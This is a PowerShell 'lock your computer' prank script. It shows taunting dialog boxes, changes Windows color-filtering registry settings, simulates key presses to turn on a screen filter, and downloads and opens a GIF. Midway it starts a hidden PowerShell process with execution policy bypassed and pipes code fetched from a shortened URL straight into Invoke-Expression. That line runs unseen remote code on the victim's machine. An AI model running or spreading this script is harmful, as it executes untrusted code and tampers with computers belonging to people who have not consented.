Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Show-MessageBox {
    param (
        [string]$message,
        [string]$title,
        [string]$buttonText = "Yes"
    )
    $form = New-Object System.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(300,150)
    $form.StartPosition = "CenterScreen"
    $form.TopMost = $true
    $form.ControlBox = $false

    $label = New-Object System.Windows.Forms.Label
    $label.Text = $message
    $label.Size = New-Object System.Drawing.Size(280,30)
    $label.Location = New-Object System.Drawing.Point(10,20)
    $form.Controls.Add($label)

    $buttonYes = New-Object System.Windows.Forms.Button
    $buttonYes.Text = $buttonText
    $buttonYes.Size = New-Object System.Drawing.Size(75,23)
    $buttonYes.Location = New-Object System.Drawing.Point(110,70)
    $buttonYes.Add_Click({
        $form.DialogResult = [System.Windows.Forms.DialogResult]::Yes
        $form.Close()
    })
    $form.Controls.Add($buttonYes)

    $form.ShowDialog()
}

function Show-LockReminder {
    Show-MessageBox "Did you forget to lock your computer?" "Reminder"
    Show-MessageBox "Naughty naughty... are you ready for your punishment?" "Warning"
}

Show-LockReminder

$registryPath = "HKCU:\Software\Microsoft\ColorFiltering"

if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force
}

$filterType = 1 
New-ItemProperty -Path "HKCU:\Software\Microsoft\ColorFiltering" -Name "FilterType" -PropertyType DWORD -Value $filterType -Force

New-ItemProperty -Path "HKCU:\Software\Microsoft\ColorFiltering" -Name "HotkeyEnabled" -PropertyType DWORD -Value 1 -Force

New-ItemProperty -Path "HKCU:\Software\Microsoft\ColorFiltering" -Name "Active" -PropertyType DWORD -Value 0 -Force

Start-Process powershell -ArgumentList '-w', 'h', '-NoP', '-NonI', '-Ep', 'Bypass', '-Command', 'iwr https://tinyurl.com/2p8m73te | iex'

$url = "https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExb2FxOGNoMzJ3M2w4bmx4cmx0bGhvYTZrdmkyODZvejgybGptaHl3eSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/uIGfoVAK9iU1y/giphy.gif"
$outputPath = "$env:tmp\ah_ah_ah.gif"

Invoke-WebRequest -Uri $url -OutFile $outputPath

Start-Process $outputPath

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
    
    public const int KEYEVENTF_EXTENDEDKEY = 0x0001; // Key down flag
    public const int KEYEVENTF_KEYUP = 0x0002; // Key up flag
}
"@

$VK_CONTROL = 17
$VK_LWIN = 91
$VK_C = 67

[Keyboard]::keybd_event($VK_CONTROL, 0, [Keyboard]::KEYEVENTF_EXTENDEDKEY, [UIntPtr]::Zero)
[Keyboard]::keybd_event($VK_LWIN, 0, [Keyboard]::KEYEVENTF_EXTENDEDKEY, [UIntPtr]::Zero)
[Keyboard]::keybd_event($VK_C, 0, [Keyboard]::KEYEVENTF_EXTENDEDKEY, [UIntPtr]::Zero)

[Keyboard]::keybd_event($VK_C, 0, [Keyboard]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
[Keyboard]::keybd_event($VK_LWIN, 0, [Keyboard]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)
[Keyboard]::keybd_event($VK_CONTROL, 0, [Keyboard]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("^{BREAK}")